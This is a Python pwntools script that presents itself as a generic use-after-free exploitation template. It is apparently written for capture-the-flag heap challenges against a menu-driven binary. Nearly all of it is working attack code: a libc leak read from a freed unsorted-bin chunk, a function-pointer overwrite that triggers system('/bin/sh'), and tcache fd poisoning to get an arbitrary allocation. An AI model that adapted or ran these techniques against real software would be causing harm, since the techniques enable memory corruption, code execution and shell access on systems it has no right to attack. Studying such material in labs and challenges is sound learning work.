#!/usr/bin/env python3
"""
use after free

Generic UAF exploitation template.

Common UAF patterns:
    1. UAF to leak: free chunk, read fd pointer → heap/libc leak
    2. UAF to write: free chunk, allocate over it → hijack function ptr/vtable
    3. UAF + tcache: free → poison fd → arbitrary alloc

Flow:
    1. Allocate victim chunk
    2. Store a reference/index to victim
    3. Free victim (but reference/index remains valid)
    4. Allocate new chunk (same size) → reuses freed memory
    5. Use stale reference → reads/writes new chunk's data
"""
from pwn import *
import sys

BINARY = './chall'
LIBC   = ''
HOST   = '127.0.0.1'
PORT   = 1337

context.arch = 'amd64'
context.log_level = 'info'

elf  = ELF(BINARY) if os.path.exists(BINARY) else None
libc = ELF(LIBC) if LIBC and os.path.exists(LIBC) else None

def conn():
    if 'local' in sys.argv:
        return process(BINARY)
    return remote(HOST, PORT)


def alloc(p, size, data=b'A'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendlineafter(b'data: ', data)

def free(p, idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def edit(p, idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'data: ', data)

def show(p, idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline()


# TECHNIQUE 1: UAF → Leak libc (unsorted bin)

def leak_libc_uaf():
    """
    Free a chunk into unsorted bin → fd/bk = main_arena+88/96
    Read via UAF → libc base.

    Need chunk size > 0x408 (skip tcache) or fill tcache first.
    """
    p = conn()

    LARGE = 0x420   # unsorted bin size (bypasses tcache)

    alloc(p, LARGE, b'AAAA')  # idx 0
    alloc(p, 0x20, b'guard')  # idx 1 — prevent top chunk consolidation

    free(p, 0)  # → unsorted bin → fd = main_arena+96

    # UAF read — show freed chunk
    leak_data = show(p, 0)
    libc_leak = u64(leak_data[:8])
    log.success(f'libc leak (main_arena+96) = {hex(libc_leak)}')

    # main_arena offset: readelf -s libc.so.6 | grep __malloc_hook
    # main_arena = __malloc_hook + 0x10 (glibc 2.27-2.34)
    # main_arena + 96 = libc_base + main_arena_offset + 96
    MAIN_ARENA_OFFSET = 0x219c80  # ADJUST for your libc (run: pwndbg > p &main_arena)
    libc_base = libc_leak - MAIN_ARENA_OFFSET - 96

    log.success(f'libc base = {hex(libc_base)}')
    return p, libc_base


# TECHNIQUE 2: UAF → Function pointer hijack

def hijack_fptr():
    """
    Object with function pointer (C++ vtable, struct with fn ptr).

    struct Obj {
        void (*fn)(struct Obj*);  // offset 0
        char data[...];           // offset 8
    };

    UAF: free Obj → allocate new data over it → overwrite fn ptr → trigger.
    """
    p = conn()

    OBJ_SIZE = 0x30

    # Allocate object with function pointer
    alloc(p, OBJ_SIZE, b'AAAA')   # idx 0 = victim object

    # Free object (but index/reference remains valid)
    free(p, 0)

    # Allocate same size → reuses freed chunk → overwrites fn ptr
    evil_ptr = 0x0   # FILL: system, win, one_gadget, etc.
    evil_data = p64(evil_ptr) + b'/bin/sh\x00'
    alloc(p, OBJ_SIZE, evil_data)  # overwrites victim's fn ptr

    # Trigger the stale reference → calls our evil_ptr
    # e.g., "use object 0" → calls obj->fn(obj) = system("/bin/sh")
    # Adjust based on challenge
    p.sendlineafter(b'> ', b'5')   # "use"
    p.sendlineafter(b'idx: ', b'0')

    p.interactive()


# TECHNIQUE 3: UAF + tcache poison

def uaf_tcache():
    """UAF → edit freed chunk fd → tcache poison → arbitrary alloc."""
    p = conn()

    SIZE = 0x30

    alloc(p, SIZE, b'AAAA')  # idx 0
    alloc(p, SIZE, b'BBBB')  # idx 1

    free(p, 0)  # goes to tcache

    # UAF edit: overwrite fd of freed chunk → point to target
    target = 0x0   # FILL: __free_hook, GOT, etc.
    edit(p, 0, p64(target))  # overwrite fd via UAF

    # Allocate: first gets old chunk, second gets target
    alloc(p, SIZE, b'JUNK')              # consume old chunk
    alloc(p, SIZE, p64(0xdeadbeef))      # get chunk at target!

    p.interactive()

if __name__ == '__main__':
    leak_libc_uaf()
